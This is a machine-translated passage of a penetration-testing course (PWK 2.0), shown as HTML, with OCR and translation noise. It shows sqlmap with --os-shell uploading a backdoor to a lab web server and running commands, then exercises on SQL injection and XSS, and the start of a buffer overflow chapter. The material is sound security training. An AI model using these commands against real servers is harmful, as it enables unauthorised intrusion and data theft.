<div style="position:absolute;top:25633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shel</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:25650;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">升</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:25667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:25684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[14:00:49] [INFO] 尝试通过 LIMIT 'LI 在'C:/xampp/htdocs/' 上传文件 stager</font></font></nobr></div>
<div style="position:absolute;top:25701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NES TERMINATED BY' 方法</font></font></nobr></div>
<div style="position:absolute;top:25718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[14:00:49] [INFO] 文件 stager 已成功上传到“C:/xampp/htdocs/”</font></font></nobr></div>
<div style="position:absolute;top:25735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- http://10.11.0.22:80/tmpuwryd.php</font></font></nobr></div>
<div style="position:absolute;top:25752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[14:00:49] [INFO] 后门已成功上传到“C:/xampp/htdocs/”-</font></font></nobr></div>
<div style="position:absolute;top:25769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22:80/tmpbtxja.php</font></font></nobr></div>
<div style="position:absolute;top:25786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[14:00:49] [INFO]</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用 OS shell。</font><font style="vertical-align: inherit;">要退出，请键入“x”或“q”，然后按 ENTER</font></font></font></b></nobr></div>
<div style="position:absolute;top:25803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统外壳&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipconfig</font></font></font></b></nobr></div>
<div style="position:absolute;top:25820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你想检索命令标准输出吗？</font><font style="vertical-align: inherit;">[Y / N / A] </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ÿ</font></font></font></b></nobr></div>
<div style="position:absolute;top:25837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令标准输出：</font></font></nobr></div>
<div style="position:absolute;top:25854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---</font></font></nobr></div>
<div style="position:absolute;top:25888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows IP 配置</font></font></nobr></div>
<div style="position:absolute;top:25939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以太网适配器 Ethernet0:</font></font></nobr></div>
<div style="position:absolute;top:25973;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于连接的 DNS 后缀。</font><font style="vertical-align: inherit;">: 本地域</font></font></nobr></div>
<div style="position:absolute;top:25990;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链路本地 IPv6 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">：fe80::c5a0:cbd8:9e03:3f85%7</font></font></nobr></div>
<div style="position:absolute;top:26007;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:26024;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网掩码 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 255.255.255.0</font></font></nobr></div>
<div style="position:absolute;top:26041;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认网关 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 10.11.0.2</font></font></nobr></div>
<div style="position:absolute;top:26074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以太网适配器蓝牙网络连接：</font></font></nobr></div>
<div style="position:absolute;top:26108;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">媒体状态。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 媒体断开</font></font></nobr></div>
<div style="position:absolute;top:26126;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于连接的 DNS 后缀。</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:26143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---</font></font></nobr></div>
<div style="position:absolute;top:26159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统外壳&gt;</font></font></nobr></div>
<div style="position:absolute;top:26179;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 337 - 使用 sqlmap 获得 OS shell </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:26311;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="23"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 23 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:26344;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:27421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:27421;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:27421;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">343</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:26440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦sqlmap建立了一个shell，我们就可以在服务器上运行命令并查看输出，如</font></font></nobr></div>
<div style="position:absolute;top:26459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如图 337 所示。这个壳可能有点慢，但它可以提供一个有效的立足点来获得</font></font></nobr></div>
<div style="position:absolute;top:26478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问底层服务器。</font></font></nobr></div>
<div style="position:absolute;top:26511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，OSCP 考试不允许使用 sqlmap。</font><font style="vertical-align: inherit;">但是，我们建议练习</font></font></nobr></div>
<div style="position:absolute;top:26531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在实验室和 Windows 10 实验室机器上使用它。</font><font style="vertical-align: inherit;">考虑结合使用它</font></font></nobr></div>
<div style="position:absolute;top:26550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Burp 和 Wireshark 等工具来捕获工具正在做什么，然后尝试复制</font></font></nobr></div>
<div style="position:absolute;top:26569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动攻击。</font><font style="vertical-align: inherit;">这通常是一种非常有效的学习技巧，不容忽视。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:26604;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.13 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:26634;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 sqlmap 获取数据库的完整转储。</font></font></nobr></div>
<div style="position:absolute;top:26662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用sqlmap 获取交互式shell。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:26699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.5 额外里程</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:26741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 实验室机器包含一个额外的 Web 应用程序，用于练习 XSS 和 SQL</font></font></nobr></div>
<div style="position:absolute;top:26760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注入漏洞。</font><font style="vertical-align: inherit;">该应用程序是用 Java 编写的，使用 Spring 框架，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">290</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并运行</font></font></nobr></div>
<div style="position:absolute;top:26780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在端口 9090 上。可以使用以下命令运行该应用程序：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:26814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\tools\web_attacks&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">java -jar gadgets-1.0.0.jar</font></font></font></b></nobr></div>
<div style="position:absolute;top:26832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:26848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019-06-13 10:29:36.962 INFO 4976 --- [主要]</font></font></nobr></div>
<div style="position:absolute;top:26865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com.pwk.webapp.GadgetsApplication : 在 DESKTOP-IPD21BB 机智上启动 GadgetsApplication</font></font></nobr></div>
<div style="position:absolute;top:26882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（C:\tools\web_attacks\gadgets-1.0.0.jar 由管理员在 C:\tools\web_attacks 中启动）</font></font></nobr></div>
<div style="position:absolute;top:26899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:26917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019-06-13 10:29:42.680 信息 4976 --- [主要]</font></font></nobr></div>
<div style="position:absolute;top:26933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">osbwembedded.tomcat.TomcatWebServer ：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tomcat 在端口上启动：9090 (http)</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> with</font></font></nobr></div>
<div style="position:absolute;top:26950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019-06-13 10:29:42.759 信息 4976 --- [主要]</font></font></nobr></div>
<div style="position:absolute;top:26967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com.pwk.webapp.GadgetsApplication ：在 7.047 秒内启动 GadgetsApplication (JVM r</font></font></nobr></div>
<div style="position:absolute;top:26986;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 338 - 在 Windows 上启动额外的应用程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:27016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行后，我们可以在端口 9090 上访问它：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:27371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">290 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（2019 年春季），https://docs.spring.io/spring/docs/current/spring-framework-reference/overview.html#overview</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:27499;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="24"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 24 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:27532;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:28609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:28609;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:28609;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">344</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:27940;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 177：查看奖金申请</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:27971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管它包含 XSS 和 SQL，但我们不会遍历应用程序的所有漏洞</font></font></nobr></div>
<div style="position:absolute;top:27990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">至少注入漏洞。</font><font style="vertical-align: inherit;">要关闭应用程序，请关闭命令窗口</font></font></nobr></div>
<div style="position:absolute;top:28009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或使用</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C c</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:28044;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.5.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28082;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（这些练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:28115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.识别并利用Web应用程序中的XSS漏洞。</font></font></nobr></div>
<div style="position:absolute;top:28143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 识别并利用Web 应用程序中的SQL 注入漏洞。</font></font></nobr></div>
<div style="position:absolute;top:28171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3、是否有可能通过SQL注入漏洞获得shell？</font><font style="vertical-align: inherit;">为什么或者为什么不？</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:28208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.6 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们重点介绍了常见 Web 应用程序的识别和枚举</font></font></nobr></div>
<div style="position:absolute;top:28269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞。</font><font style="vertical-align: inherit;">我们还利用了几个常见的 Web 应用程序漏洞，利用</font></font></nobr></div>
<div style="position:absolute;top:28289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种技术，包括管理控制台弱点、跨站点脚本、目录遍历、</font></font></nobr></div>
<div style="position:absolute;top:28308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地和远程文件包含，以及 SQL 注入。</font><font style="vertical-align: inherit;">这些攻击媒介是基本的构建块</font></font></nobr></div>
<div style="position:absolute;top:28328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将用来构建更高级的攻击。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:28687;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="25"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 25 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:28720;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:29797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:29797;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:29797;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">345</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:28810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.6.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:28836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10. 缓冲区溢出简介</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将介绍</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区溢出</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背后的原理</font><font style="vertical-align: inherit;">，这是一种内存</font></font></nobr></div>
<div style="position:absolute;top:28900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">腐败漏洞。</font><font style="vertical-align: inherit;">我们将回顾如何使用程序存储器，如何发生缓冲区溢出，</font></font></nobr></div>
<div style="position:absolute;top:28919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及如何使用溢出来控制应用程序的执行流程。</font><font style="vertical-align: inherit;">一个好的</font></font></nobr></div>
<div style="position:absolute;top:28938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解使这种攻击成为可能的条件对于开发利用</font></font></nobr></div>
<div style="position:absolute;top:28958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用这种类型的漏洞。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:28995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1 x86架构介绍</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:29036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解内存损坏是如何发生的以及它们如何被用于未经授权的</font></font></nobr></div>
<div style="position:absolute;top:29056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问，我们需要讨论程序存储器，了解软件在 CPU 级别是如何工作的，</font></font></nobr></div>
<div style="position:absolute;top:29075;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并概述一些基本定义。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:29137;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们讨论这些原则时，我们会经常提到大会 (asm), </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">291</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></i></nobr></div>
<div style="position:absolute;top:29157;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非常低级的编程语言，非常接近于</font></font></i></nobr></div>
<div style="position:absolute;top:29176;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CPU 内置机器代码指令。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:29238;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1.1</font></font></i></nobr></div>
<div style="position:absolute;top:29238;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序存储器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:29276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当一个二进制应用程序被执行时，它会在内存中以一种非常特定的方式分配内存</font></font></nobr></div>
<div style="position:absolute;top:29296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现代计算机使用的边界。</font><font style="vertical-align: inherit;">图 178 显示了进程内存是如何分配的</font></font></nobr></div>
<div style="position:absolute;top:29315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最低内存地址 (0x00000000) 和最高内存地址之间的 Windows</font></font></nobr></div>
<div style="position:absolute;top:29335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(0x7FFFFFFF) 应用程序使用：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:29747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">291 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Assembly_language</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:29875;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="26"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 26 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:29908;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:30985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:30985;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:30985;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">346</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:30550;left:305"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 178：剖析 Windows 中的程序内存</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管此图中概述了几个内存区域，但出于我们的目的，我们仅将</font></font></nobr></div>
<div style="position:absolute;top:30600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专注于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">堆栈</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:30634;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.1.1.1 堆栈</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:30669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当一个线程正在运行时，它会从 Program Image 或各种 Dynamic</font></font></nobr></div>
<div style="position:absolute;top:30688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链接库 (DLL)。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">292</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">线程需要一个短期数据区用于函数、局部变量、</font></font></nobr></div>
<div style="position:absolute;top:30708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和程序控制信息，称为堆栈。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">293</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为方便独立</font></font></nobr></div>
<div style="position:absolute;top:30727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行多个线程，运行的应用程序中的每个线程都有自己的堆栈。</font></font></nobr></div>
<div style="position:absolute;top:30760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CPU 将堆栈内存“视为”后进先出 (LIFO) 结构。</font><font style="vertical-align: inherit;">这基本上意味着</font></font></nobr></div>
<div style="position:absolute;top:30779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在访问堆栈时，放置（“推送”）在堆栈顶部的项目被删除（“弹出”）</font></font></nobr></div>
<div style="position:absolute;top:30798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一的。</font><font style="vertical-align: inherit;">x86 架构实现了专用的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PUSH</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">POP</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">汇编指令，以便</font></font></nobr></div>
<div style="position:absolute;top:30818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别向堆栈添加或删除数据。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:30915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">292 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/desktop/dlls/dynamic-link-libraries</font></font></font></nobr></div>
<div style="position:absolute;top:30935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">293 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（教程点，2020 年），https://www.tutorialspoint.com/assembly_programming/assembly_procedures.htm</font></font></font></nobr></div>
</span></font>

